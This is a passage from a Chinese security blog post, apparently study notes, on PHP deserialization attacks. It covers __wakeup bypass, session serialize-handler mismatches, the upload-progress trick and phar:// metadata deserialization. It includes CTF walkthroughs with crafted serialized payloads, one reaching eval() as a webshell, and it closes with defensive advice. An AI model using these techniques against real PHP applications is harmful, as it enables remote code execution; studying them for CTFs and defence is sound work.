<p>为了更好的理解整个过程，我是通过一个一个类去调用。其实这题因为<code>Song</code>类中和<code>log</code>类中有同名的方法<code>log()</code>，而<code>Lyrics</code>类的<code>__destruct()</code>调用了<code>log()</code>方法，所以我们可以省去构造<code>Song</code>类这一步。这也是反序列化中需要注意的，我们可以<strong>通过同名方法实现调用其他类中的方法从而构造pop链</strong>。<br>不构造<code>Song</code>类可以参考：<br><code>https://mochazz.github.io/2019/01/29/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8B%E5%B8%B8%E8%A7%81%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/</code></p>
<h3 id="wakeup-绕过"><a href="#wakeup-绕过" class="headerlink" title="__wakeup()绕过"></a>__wakeup()绕过</h3><p>适用于<code>php 5.x &lt; php 5.6.25</code>和<code>php 7.x &lt; php 7.0.10</code>。<br>当序列化后的字符串中表示对象属性个数的值大于真实的属性个数时，在对该字符串进行反序列化的时候就会跳过<code>__wakeup()</code>的执行。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">"ll"</span>;</span><br><span class="line">    <span class="keyword">public</span> __wakeup() &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"hello"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// echo serialize(new Test()); // O:4:"Test":1:&#123;s:4:"name";s:2:"ll";&#125;</span></span><br><span class="line">$test = <span class="string">'O:4:"Test":2:&#123;s:4:"name";s:2:"ll";&#125;'</span>; <span class="comment">// 对象属性个数1改为了2</span></span><br><span class="line">unserialize($b); <span class="comment">// 未输出hello</span></span><br></pre></td></tr></table></figure>
<p>在<code>unserialize()</code>反序列化之前，会先调用<code>__wakeup()</code>方法。我们可以通过该技巧绕过<code>__wakeup()</code>中的属性检查或属性初始化。</p>
<h3 id="session反序列化"><a href="#session反序列化" class="headerlink" title="session反序列化"></a>session反序列化</h3><p>当<code>session_start()</code>被调用或者 php.ini 中<code>session.auto_start</code>被设置为 1 时，php 内部会调用会话管理器，访问用户的<code>$_SESSION</code>，并将其中的值序列化后存入指定目录的文件中。<br>php.ini 中有关参数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">session.auto_start  指定会话模块是否在请求开始时启动一个会话。默认为0不启动。</span><br><span class="line">session.save_handler  session保存形式，默认为files。</span><br><span class="line">session.save_path  session保存路径，默认为/tmp。文件默认以sess_xxx开头。</span><br><span class="line">session.upload_progress.cleanup  一旦读取了所有post数据，立即清除进度信息。默认开启。</span><br><span class="line">session.upload_progress.enabled  将上传文件的进度信息存在session中。默认开启。</span><br><span class="line">session.serialize_handler  定义用来序列化和反序列化的处理器名字。默认是php。</span><br></pre></td></tr></table></figure>
<h4 id="三种处理器"><a href="#三种处理器" class="headerlink" title="三种处理器"></a>三种处理器</h4><p>我们从参数<code>session.serialize_handler</code>开始：</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/08.png" alt="08"></p>
<p>主要看<code>php</code>和<code>php_serialize</code>这两种序列化机制：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'...'</span>) <span class="comment">// php | php_serialize</span></span><br><span class="line">sesssion_start(); <span class="comment">// session_start('serialize_handler', '...');</span></span><br><span class="line">$_SESSION[<span class="string">'name'</span>] = <span class="string">'LL'</span>;</span><br></pre></td></tr></table></figure>
<p>当 session.serialize_handler=php 时，/tmp 目录下的 session 文件内容为：<code>name|s:2:&quot;LL&quot;;</code><br>当 session.serialize_handler=php_serialize 时，session 文件内容为：<code>a:1:{s:4:&quot;name&quot;;s:2:&quot;LL&quot;;}</code><br>可以看到 php_serilaize 机制就是直接对数组 $_SESSION 调用了 serialize() 。而 php 机制格式是<code>键名|反序列化的键值</code>。</p>
<h4 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h4><p>session 反序列化漏洞产生的原因主要是因为，将信息存入 session 文件时和将信息从 session 文件中取出来时，使用了不同的 session 处理器。<br>仔细看一下 php 处理器的格式，会发现它是通过<code>|</code>分割数组键和值的，即当要从 session 文件中取出信息时，它会先去找<code>|</code>分割符，找到后，将前面的部分直接取出作为键名，后面的部分调用 serialize() 反序列化后作为键值放入$_SESSION数组中。<br>那如果我们向 session 文件中存入数据时，使用的是 php_serialize 处理机制，比如存入<code>$_SESSION[&#39;name&#39;]=&#39;|evil&#39;</code>，可见我恶意加了一个<code>|</code>分割符，存进去后，session 文件内容为<code>a:1:{s:4:&quot;name&quot;;s:5:&quot;|evil&quot;;}</code>，因为在调用 serialize() 进行序列化的时候，会将键值直接放入序列化后的字符串中的某一部分，可见<code>|evil</code>被直接写进去了。那如果我们从 session 文件中取数据时，用了 php 处理机制，根据前面所说，会取出<code>$_SESSION[&#39;a:1:{s:4:&quot;name&quot;;s:5:&quot;&#39;] = 对 evil&quot;;} 进行反序列化后的值</code>，而<code>|</code>后面的数据在我们传入时可控，在取出时会对后面的值进行反序列化。 </p>
<h4 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">call_user_func($_GET[<span class="string">'a'</span>], $_POST); </span><br><span class="line">$_SESSION[<span class="string">'name'</span>] = $_GET[<span class="string">'b'</span>];</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">'flag.php'</span>);</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里借用了 lctf 2018 的一行代码<code>call_user_func($_GET[&#39;a&#39;], $_POST);</code>。我们先生成一个序列化后的 test 类，值为<code>O:4:&quot;test&quot;:0:{}</code>。<br>通过<code>call_user_func($_GET[&#39;a&#39;], $_POST)</code>在存储 session 信息时，改变序列化 session 的处理器，默认为 php，我们改为 php_serialize 。具体可以去看一下<code>session_start()</code>手册内容。</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/09.png" alt="09"></p>
<p>以 php_serialize 方式存储 session 信息，记得加<code>|</code>：</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/10.png" alt="10"></p>
<p>可以看到我们成功将序列化的 test 类存储进 session 文件中，并且是以 php_serialize 格式：</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/11.png" alt="11"></p>
<p>带着上一步服务器返回的<code>PHPSESSID</code>，不传入 post 数据，即等于直接调用<code>session_start()</code>，此时默认处理器为 php ，取出数据时以<code>|</code>分割，将后面部分反序列化成 test 类，当调用 __destruct() 时读出 flag ：</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/12.png" alt="12"></p>
<h4 id="上传表单"><a href="#上传表单" class="headerlink" title="上传表单"></a>上传表单</h4><p>上面的情况是我们可以控制存储和取出 session 信息时，php 对 session 信息的处理方式，存储的时候以 php_serialize 机制序列化，取出的时候以 php 机制反序列化，因为格式的差异导致部分数据可控。<br>那如果我们无法任意控制 php 对 session 数据的处理呢？我们可以利用另外一种技巧。</p>
<p><code>session.upload_progress.enabled</code>是一个默认开启的选项，它会将上传文件时的进度信息，填充进 $_SESSION 数组。<br>当一个文件上传时，如果同时 post 一个与 php.ini 中设置的<code>session.upload_progress.name</code>的值同名的变量，上传进度将会写入<code>$_SESSION</code>中。<br><code>session.upload_progress.name</code>默认值是<code>PHP_SESSION_UPLOAD_PROGRESS</code>。<br>当 php 检测到这种 post 请求时，会在 $_SESSION 中添加一组数据，索引是<code>session.upload_progress.prefix</code>的值加上 post 中<code>PHP_SESSION_UPLOAD_PROGRESS</code>对应的值。<br><code>session.upload_progress.prefix</code>默认值是<code>upload_progress_</code>。<br>为了方便，我们把<code>session.upload_progress.cleanup</code>设置为<code>Off</code>。</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/13.png" alt="13"></p>
<h4 id="例题-2"><a href="#例题-2" class="headerlink" title="例题"></a>例题</h4><p><a href="http://web.jarvisoj.com:32784/" target="_blank" rel="noopener">题目</a>直接给出了源码：</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/14.png" alt="14"></p>
<p>这里看到开启了session会话，那我们就直接去看一下<code>phpinfo()</code>中 session 部分的设置：</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/15.png" alt="15"></p>
<p>可以看到默认环境中是<code>php_serialize</code>的处理器，而因为该脚本调用了<code>ini_set()</code>修改了配置项，所以脚本中是<code>php</code>处理器。<br>还可以看到当<code>OowoO</code>类调用<code>__destruct()</code>方法时，会执行<code>eval()</code>函数，而传入该函数的是<code>OowoO</code>类的属性<code>$mdzz</code>，我们只要控制了该属性便可以构造一个 webshell。<br>为了看到具体过程，我们在本地复现一下。在最后打印一下 $_SESSION 可以看出反序列化时的操作。</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/16.png" alt="16"></p>
<p>要提交的序列化数据：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mdzz = <span class="string">"echo 'll';"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> OowoO()); <span class="comment">// O:5:"OowoO":1:&#123;s:4:"mdzz";s:10:"echo 'll';";&#125;</span></span><br></pre></td></tr></table></figure>
<p>提交表单：</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/17.png" alt="17"></p>
<p>执行了<code>echo &#39;ll&#39;;</code>：</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/18.png" alt="18"></p>
<p>总结一下整个过程，首先通过上面所讲的上传技巧，将上传文件的信息放进了 $_SESSION 中，该信息的一部分内容我们可以控制，然后 php 会以默认的环境中的处理器，在这里是 php_serialize ，处理该内容并存储进了 session 文件中。在从 test.html 转到 test.php 页面后，test.php 页面中因为通过<code>ini_set()</code>修改了 session 处理器为 php ，所以该页面以 php 反序列化的格式取出了该内容，在反序列化时将<code>OowoO</code>类还原，而该类中的<code>$mdzz</code>属性是我们可控的。<br>从上图的 session 文件中看到，因为在 test.php 中是以 php 格式取出该 session 文件的内容，可见键名是我们恶意构造的<code>|</code>前面的部分，而键值是<code>|</code>后面可利用的序列化值。除了在上传文件名<code>filename</code>中传入序列化数据，也可以在表单的<code>name</code>属性中传入序列化数据，因为两者都会在 session 文件出现，只要我们控制好<code>|</code>分割符即可。</p>
<h3 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h3><p>从上面可知，一般的反序列化漏洞需要找到<code>unserialize()</code>函数才能利用，session反序列化，可以不需要使用到该函数，但是利用条件比较苛刻（<del>我感觉</del>）。而在 2018 Black Hat 上的议题中讲了一种新的反序列化利用方法，利用 phar 文件会以序列化的形式存储用户自定义的<code>meta-data</code>这一特性，扩展了 php 反序列化漏洞的攻击面。</p>
<h4 id="phar文件结构"><a href="#phar文件结构" class="headerlink" title="phar文件结构"></a>phar文件结构</h4><ol>
<li>a stub<br>一个识别标志，前面的内容没有限制，但必须以<code>__HALT_COMPILER();?&gt;</code>结尾，为了让 phar 扩展可以识别该文件是一个 phar 文件。</li>
<li>a manifest describing the contents<br>phar 文件本身是一个归档文件，类似 java 中的 jar 文件，里面存放了各文件的权限、属性等信息。这部分还会以<strong>序列化</strong>的形式存储用户自定义的 meta-data ，这是也是该攻击手法的核心之处。</li>
</ol>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/19.png" alt="19"></p>
<ol start="3">
<li>the file contents<br>具体的文件内容。</li>
<li>[optional] a signature for verifying Phar integrity (phar file format only)<br>签名，放在文件末尾。</li>
</ol>
<h4 id="创建phar文件"><a href="#创建phar文件" class="headerlink" title="创建phar文件"></a>创建phar文件</h4><p>php 中内置了一个<code>Phar</code>类来处理相关的操作，需要将<code>php.ini</code>中的<code>phar.readonly</code>设置为<code>Off</code>，否则无法生成 phar 文件，且要把 phar 写入的文件夹的权限设为可写。</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20.png" alt="20"></p>
<p>可以看到该文件中的 meta-data ，即存入的<code>Test</code>类，是以序列化形式存储的：</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/21.png" alt="21"></p>
<p>php 中一大部分的文件系统函数在通过<code>phar://</code>伪协议解析 phar 文件时，都会将 meta-data 进行反序列化，受影响函数如下：</p>
<table>
<thead>
<tr>
<th>受影响函数列表</th>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>fileatime</td>
<td>filectime</td>
<td>file_exists</td>
<td>file_get_contents</td>
</tr>
<tr>
<td>file_put_contents</td>
<td>file</td>
<td>filegroup</td>
<td>fopen</td>
</tr>
<tr>
<td>fileinode</td>
<td>filemtime</td>
<td>fileowner</td>
<td>fileperms</td>
</tr>
<tr>
<td>is_dir</td>
<td>is_executable</td>
<td>is_file</td>
<td>is_link</td>
</tr>
<tr>
<td>is_readable</td>
<td>is_writable</td>
<td>is_writeable</td>
<td>parse_ini_file</td>
</tr>
<tr>
<td>copy</td>
<td>unlink</td>
<td>stat</td>
<td>readfile</td>
</tr>
</tbody>
</table>
<h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><p>在另一文件<code>phar_test.php</code>中测试我们刚刚生成的<code>test.phar</code>。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Destruct called'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$filename = <span class="string">'phar://test.phar/test.txt'</span>;</span><br><span class="line">file_get_contents($filename);</span><br></pre></td></tr></table></figure></p>
<p>成功将序列化后的 meta-data 进行反序列化：</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/22.png" alt="22"></p>
<h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><ol>
<li>phar 文件要能够上传到服务器。</li>
<li>有可用的魔术方法作为跳板。</li>
<li>文件操作函数的参数可控，且<code>:</code>、<code>/</code>、<code>phar</code>等特殊字符没有被过滤。</li>
</ol>
<h4 id="例题-3"><a href="#例题-3" class="headerlink" title="例题"></a>例题</h4><p>可以参考<a href="http://llfam.cn/2019/03/04/annoying%20class/#more" target="_blank" rel="noopener">这里</a>。<br>该题还在<code>a stub</code>中伪造了gif的文件头。因为 php 只是通过文件头中的 stub 识别 phar 文件，确切说是<code>__HALT_COMPILER();?&gt;</code>这段代码，对前面内容或者后缀名没有要求。</p>
<h3 id="学习理解php源码"><a href="#学习理解php源码" class="headerlink" title="学习理解php源码"></a>学习理解php源码</h3><p>最近对 php 源码很感兴趣，因为前段时间发现在一些 ctf 比赛中，经常会从源码入手实现一些利用。比如有关 SimpleXMLELement 类的 xxe 、有关 SoapClient 类的 ssrf 等。<br>正在<del>努力</del>学习<a href="https://github.com/reeze/tipi/tree/master/web/releases" target="_blank" rel="noopener">《深入理解php内核》</a>，但是看不懂…，这里就试试结合各位师傅的文章去理解一下 phar 反序列化的底层实现。</p>
<h4 id="理解php流"><a href="#理解php流" class="headerlink" title="理解php流"></a>理解php流</h4><p>在 php 中，<code>fopen()</code>函数可以用<code>file://</code>打开本地文件、可以用 url 打开远程文件、也可以用<code>phar://</code>打开 phar 文件，打开后会返回一个句柄，而<code>fread()</code>、<code>fwrite()</code>等函数能对资源句柄进行读写操作，<code>fclose()</code>可以关闭资源。那 php 是如何做到使用一致的 api 对不同数据源进行操作的呢？这是因为 php 引入了“流”的概念，为不同的资源提供了统一的接口。<br>参考该<a href="https://tlanyan.me/php-review-stream/" target="_blank" rel="noopener">文章</a>可知，<code>fopen()</code>函数会先查找路径是否以<code>http://</code>、<code>ftp://</code>等协议开头，有则从注册的包装器列表中查找对应包装器，<code>fopen()</code>返回的流对象由包装器打开。在基础级别上，<a href="https://secure.php.net/manual/zh/internals2.ze1.streams.php" target="_blank" rel="noopener">stream api</a> 定义<code>php_stream</code>对象为流操作的资源。<br>简单来说，php 中的流就像是 unix 中的管道，通过管道，可以将我们的数据从一个地方传输到另一个地方。任何流一旦打开，也可以应用任意数量的过滤器，这些过滤器在读取/写入流时处理数据。</p>
<h4 id="理解php-wrapper"><a href="#理解php-wrapper" class="headerlink" title="理解php wrapper"></a>理解php wrapper</h4><p>因为存在各种各样的可流式数据，所以包装器可以对其接口进行封装。流操作的支持和具体操作由包装器决定。同样是读取数据（fread)，从文件中读和从内存中读做法不同。另外有些操作对某些流不适用。例如 http 协议支持 fread ，但不支持 fwrite 。内置的协议包装器列表参考官方文档中的<a href="https://www.php.net/manual/en/wrappers.php" target="_blank" rel="noopener">Supported Protocols and Wrappers</a>。<br>在 php 中默认的流封装协议是<code>file://</code>，具体可参考<a href="https://laravelacademy.org/post/7459.html%EF%BC%8C%E9%82%A3%E4%B9%88%E8%BF%99%E4%B8%AA%E8%AF%B4%E6%98%8E%E4%BA%86%E4%B8%80%E4%B8%AA%E4%BB%80%E4%B9%88%E9%97%AE%E9%A2%98%E5%91%A2%EF%BC%9F%E8%AF%B4%E6%98%8E%E6%88%91%E4%BB%ACPHP" target="_blank" rel="noopener">这里</a>。<br>可以通过<code>stream_get_wrappers()</code>查看当前系统中注册的 wrapper ：</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/23.png" alt="23"></p>
<h4 id="查看源码"><a href="#查看源码" class="headerlink" title="查看源码"></a>查看源码</h4><p>我们先看一下常见的<code>fopen()</code>函数，定义在<code>ext/standard/file.c line 870</code>（ ext 是官方扩展目录，包括了绝大多数 php 的函数定义和实现）：</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/24.png" alt="24"></p>
<p>上部分是一些变量的初始化，主要看下部分。<code>fopen()</code>的主要工作是获取了流对象并通过<code>php_stream_to_zval()</code>转化成 php 值类型（ zval ）返回。流对象由<code>php_stream_open_wrapper_ex</code>函数返回。ctags 跟一下，发现其宏定义在<code>main/php_stream.h line 573</code>（ main 目录主要实现了 php 的基本设施）:</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/25.png" alt="25"></p>
<p><code>_php_stream_open_wrapper_ex()</code>在<code>main/streams/stream.c line 1984</code>，结合该<a href="https://tlanyan.me/php-review-stream/" target="_blank" rel="noopener">文章</a>可以看到<code>_php_stream_oprn_wrapper_ex()</code>调用了<code>php_stream_locate_url_wrapper()</code>获取协议包装器（ wrapper ），再调用相应的包装器打开资源并返回流对象。</p>
<p>前面说过流操作的支持和具体操作由包装器决定，实际上，流包装器会调用 php_stream 中 ops 成员的具体函数，这些函数在包装器打开流时被正确赋值。看一下<code>_php_stream_wrapper_ops</code>，在<code>main/php_stream.h line 162</code>：</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/26.png" alt="26"></p>
<p>可以看到，一个 wrapper ，支持的功能有：打开文件、删除文件、重命名文件以及获取文件的 metadata 。所以可以知道文件系统函数是通过这个 stream api 进行操作的。<br>再看一下<code>file_get_contents()</code>的定义，发现其和<code>fopen()</code>一样，都调用了<code>php_stream_open_wrapper_ex()</code>函数。根据上面分析，该函数调用了<code>php_stream_locate_url_wrapper()</code>获取 wrapper。<br>phar 组件注册了<code>phar://</code>这个wrapper，即<code>fopen()</code>和<code>file_get_contents()</code>这些函数都能通过<code>php_stream_locate_url_wrapper()</code>找到该 wrapper。看一下<code>phar://</code>这个 wrapper 的定义：</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/27.png" alt="27"></p>
<p>这些函数都会最终都会调用<code>phar_var_unserialize()</code>。<br>总结一下，以<code>fopen()</code>为例，其他文件系统函数同理。首先一个流包装器会调用 php_stream 中 ops 成员的具体函数，phar 组件注册了一个<code>phar://</code> wrapper ，定义了 ops 中的部分函数，<code>fopen()</code>是通过 ops 成员提供 stream api 进行操作，且<code>fopen()</code>能通过<code>php_stream_locate_url_wrapper()</code>找到<code>phar://</code> wrapper，当调用该 wrapper 的功能时，因为每个函数实现都最终调用了<code>phar_var_unserialize()</code>，所以所有文件系统函数都可以触发此 phar 漏洞。</p>
<p>这些文件系统函数的一个共同特点就是，都调用了<code>php_stream_locate_url_wrapper()</code>去获取 wrapper ，所以可以全局搜索一下调用该函数的<code>php_stream_open_wrapper_ex()</code>。</p>
<h4 id="整理"><a href="#整理" class="headerlink" title="整理"></a>整理</h4><p><strong>exif</strong></p>
<ul>
<li>exif_thumbnail</li>
<li>exif_imagetype</li>
</ul>
<p><strong>gd</strong></p>
<ul>
<li>imageloadfont</li>
<li>imagecreatefrom…</li>
</ul>
<p><strong>hash</strong></p>
<ul>
<li>hash_hmac_file</li>
<li>hash_file</li>
<li>hash_update_file</li>
<li>md5_file</li>
<li>sha1_file</li>
</ul>
<p><strong>file/url</strong></p>
<ul>
<li>touch()</li>
<li>get_meta_tags</li>
<li>get_headers</li>
</ul>
<p><strong>standard</strong></p>
<ul>
<li>getimagesize</li>
<li>getimagesizefromstring</li>
</ul>
<p><strong>zip</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$zip = <span class="keyword">new</span> ZipArchive();</span><br><span class="line">$res = $zip-&gt;open(<span class="string">'c.zip'</span>);</span><br><span class="line">$zip-&gt;extractTo(<span class="string">'phar://test.phar/test'</span>);</span><br></pre></td></tr></table></figure></p>
<p>更多请看<a href="https://blog.zsxsoft.com/post/38?from=timeline&amp;isappinstalled=0" target="_blank" rel="noopener">zsx</a>师傅、<a href="https://www.k0rz3n.com/2018/11/19/一篇文章带你深入理解PHP反序列化漏洞/#0X05-利用-phar-拓展-PHP-反序列化的攻击面" target="_blank" rel="noopener">k0rz3n</a>师傅的博客。</p>
<h4 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h4><p>当<code>phar://</code>不能出现在前几个字符时候，可以使用<code>compress.bzip2</code>或者<code>compress.zlib://</code>：</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/28.png" alt="28"></p>
<h3 id="出现场景"><a href="#出现场景" class="headerlink" title="出现场景"></a>出现场景</h3><p>内容来自owasp：<br>在应用程序中，序列化可能被用于：</p>
<ul>
<li>远程和进程间通信（rpc/ipc）</li>
<li>连线协议、web服务、消息代理</li>
<li>缓存/持久性</li>
<li>数据库、缓存服务器、文件系统</li>
<li>http cookie、html表单参数、api身份验证令牌</li>
</ul>
<h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><p>因为反序列化的缺陷可能导致远程代码执行等严重的攻击，所以我们需要对其进行防护：</p>
<ol>
<li>对传入 unserilize() 的参数，进行严格地过滤。</li>
<li>在文件系统函数的参数可控时，进行严格地过滤。</li>
<li>严格检查上传文件内容，不能只是单纯地检查文件头</li>
<li>条件允许的情况下，禁用可执行系统命令、代码的危险函数。</li>
<li>注意不同类中的同名方法的编写，避免被用作反序列化的跳板。</li>
</ol>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>本文只是我对 php 反序列化漏洞的一点点理解与思考，也参考了很多的好文章。里面可能存在许多错误，尤其在源码学习这一部分，主要加上了很多在我看完文章分析后的个人理解，仅当作一点点参考，详细地分析可以到下面的链接中去学习 : )。</p>
<p>ref:<br><a href="https://www.k0rz3n.com/2018/11/19/一篇文章带你深入理解PHP反序列化漏洞/#0X05-利用-phar-拓展-PHP-反序列化的攻击面" target="_blank" rel="noopener">https://www.k0rz3n.com/2018/11/19/一篇文章带你深入理解PHP反序列化漏洞/#0X05-利用-phar-拓展-PHP-反序列化的攻击面</a><br><a href="https://mochazz.github.io/2018/12/30/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96bug/" target="_blank" rel="noopener">https://mochazz.github.io/2018/12/30/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96bug/</a><br><a href="https://mochazz.github.io/2019/01/29/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8Bsession%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" target="_blank" rel="noopener">https://mochazz.github.io/2019/01/29/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8Bsession%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a><br><a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">https://paper.seebug.org/680/</a><br><a href="https://blog.zsxsoft.com/post/38?from=timeline&amp;isappinstalled=0" target="_blank" rel="noopener">https://blog.zsxsoft.com/post/38?from=timeline&amp;isappinstalled=0</a><br><a href="https://tlanyan.me/php-review-stream/" target="_blank" rel="noopener">https://tlanyan.me/php-review-stream/</a><br><a href="https://laravelacademy.org/post/7459.html%EF%BC%8C%E9%82%A3%E4%B9%88%E8%BF%99%E4%B8%AA%E8%AF%B4%E6%98%8E%E4%BA%86%E4%B8%80%E4%B8%AA%E4%BB%80%E4%B9%88%E9%97%AE%E9%A2%98%E5%91%A2%EF%BC%9F%E8%AF%B4%E6%98%8E%E6%88%91%E4%BB%ACPHP" target="_blank" rel="noopener">https://laravelacademy.org/post/7459.html%EF%BC%8C%E9%82%A3%E4%B9%88%E8%BF%99%E4%B8%AA%E8%AF%B4%E6%98%8E%E4%BA%86%E4%B8%80%E4%B8%AA%E4%BB%80%E4%B9%88%E9%97%AE%E9%A2%98%E5%91%A2%EF%BC%9F%E8%AF%B4%E6%98%8E%E6%88%91%E4%BB%ACPHP</a></p>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/php/" rel="tag"># php</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/03/04/sql注入学习/" rel="next" title="sql注入学习">
                <i class="fa fa-chevron-left"></i> sql注入学习
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
